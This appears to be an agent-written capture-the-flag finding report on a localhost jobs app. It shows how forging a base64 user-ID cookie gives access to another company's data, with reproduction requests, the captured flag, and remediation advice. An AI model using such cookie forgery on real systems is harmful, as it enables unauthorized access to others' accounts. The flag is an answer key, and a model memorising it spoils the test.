## TL;DR
- Objective: Exploit IDOR vulnerability caused by using a base64-encoded cookie to store user ID
- Outcome: ACHIEVED - Horizontal privilege escalation confirmed
- Highest-impact finding: Authentication bypass via trivially forgeable cookie token
- Validation status: Confirmed with flag capture

## Target Information
- Target: 127.0.0.1:32927
- Host / base URL: http://127.0.0.1:32927
- Application or component: Company/Jobs management web application
- Authentication context: Cookie-based authentication (`access_token`)
- Relevant technology details: 
  - Cookie mechanism: `access_token="Bearer <base64_encoded_user_id>"`
  - Cookie attributes: HttpOnly; Path=/; SameSite=lax
  - No cryptographic signature or server-side session validation

## Confirmed Vulnerability
### Insecure Direct Object Reference (IDOR) via Cookie Forgery
- Affected endpoint / component: 
  - `/company/{id}/jobs` (GET)
  - `/edit_profile/{id}` (GET)
  - Any endpoint relying on `access_token` cookie for authorization
- Impact: Complete horizontal privilege escalation - any authenticated user can impersonate any other user by manipulating the base64-encoded ID in the cookie, gaining access to private company data, jobs, and potentially profile editing capabilities
- Preconditions: 
  - Valid credentials to obtain an initial session (demo/demo available on login page)
  - Knowledge of target user ID (predictable numeric sequence)
- Exact payload or PoC:
  - Original cookie value: `access_token="Bearer MQ=="` (base64 of "1")
  - Forged cookie value: `access_token="Bearer Mg=="` (base64 of "2")

## Steps to Reproduce
1. Navigate to `http://127.0.0.1:32927/` to access the login page
2. Authenticate with demo credentials: `username=demo`, `password=demo`
3. Observe the cookie set by the server: `access_token="Bearer MQ=="` (where `MQ==` is base64 encoding of "1")
4. Decode the cookie value to understand the structure: `echo "MQ==" | base64 -d` outputs `1`
5. Forge a new cookie for target user ID 2: encode "2" as `Mg==`
6. Send request to protected endpoint with forged cookie:
   ```
   GET /company/2/jobs HTTP/1.1
   Host: 127.0.0.1:32927
   Cookie: access_token="Bearer Mg=="
   ```
7. Receive unauthorized access to Company 2's private job listings

## Validation / Evidence
- Validation token / flag: `FLAG{5544c209fc4348cdb09cea2800dff832291b6e4beb9a3fb0efca09e9a3eeb1c2}`
- Tool evidence: Manual HTTP requests via requester agent
- Request evidence:
  ```
  POST /token HTTP/1.1
  Host: 127.0.0.1:32927
  Content-Type: application/x-www-form-urlencoded

  username=demo&password=demo
  ```
  Response set cookie: `access_token="Bearer MQ=="; HttpOnly; Path=/; SameSite=lax`

  ```
  GET /company/2/jobs HTTP/1.1
  Host: 127.0.0.1:32927
  Cookie: access_token="Bearer Mg=="
  ```
- Response evidence:
  ```html
  <h2>Jobs for Company 2</h2>
  <ul class="list-group">
      <li class="list-group-item">
          <p>company2 Job 1:company2 Job 1 Description</p>
      </li>
      <li class="list-group-item">
          <p>secret:FLAG{5544c209fc4348cdb09cea2800dff832291b6e4beb9a3fb0efca09e9a3eeb1c2}</p>
      </li>
  </ul>
  ```
- Notes on reliability / limitations: 
  - 100% reliable - no timing or browser interaction required
  - Works with any numeric user ID that exists in the system
  - No rate limiting or anomaly detection observed

## Remediation
- Root cause: The application uses a client-side cookie containing only the base64-encoded user ID as the authentication token, with no server-side validation, cryptographic signature, or session binding. The server blindly trusts the cookie value to determine the authenticated user's identity and authorization level.
- Recommended fix:
  1. Replace the trivial cookie with a cryptographically-signed session token (e.g., JWT with HMAC signature using server-side secret, or opaque session ID mapped to server-side session)
  2. Implement proper session management with server-side session storage
  3. Bind authorization checks to the authenticated session, not to URL parameters or client-supplied values
  4. Add integrity protection (HMAC or digital signature) to any client-side tokens
  5. Implement access control checks that verify the authenticated user has permission to access the requested resource
- Defense-in-depth:
  - Add logging and monitoring for access control violations
  - Implement rate limiting on sensitive endpoints
  - Consider adding CSRF protection for state-changing operations
  - Remove or protect the demo credentials from the login page

## How to Verify the Fix
1. Attempt the same IDOR attack after remediation:
   - Authenticate as user 1, capture the session token
   - Attempt to modify the token or forge a token for user 2
   - Request `/company/2/jobs` with the forged/modified token
2. Expected secure result:
   - Forged requests should return HTTP 401 Unauthorized or HTTP 403 Forbidden
   - The server should reject tampered tokens or tokens not matching the authenticated session
   - No access to other users' data should be possible regardless of cookie manipulation
3. Verify that session tokens are either:
   - Opaque random strings with server-side session mapping, OR
   - Cryptographically signed tokens that reject any modification

## Remaining Leads
- Confirmed blockers: None - vulnerability fully exploited
- Unverified leads:
  - `/edit_profile/{id}` endpoint likely vulnerable to same IDOR - could allow profile modification of other users
  - Other numeric user IDs may exist and be accessible
  - Potential for vertical privilege escalation if admin accounts use same mechanism
- Missing context: 
  - Total number of users/companies in the system
  - Whether profile editing can cause further damage (data modification)
  - Whether any admin or elevated privilege accounts exist
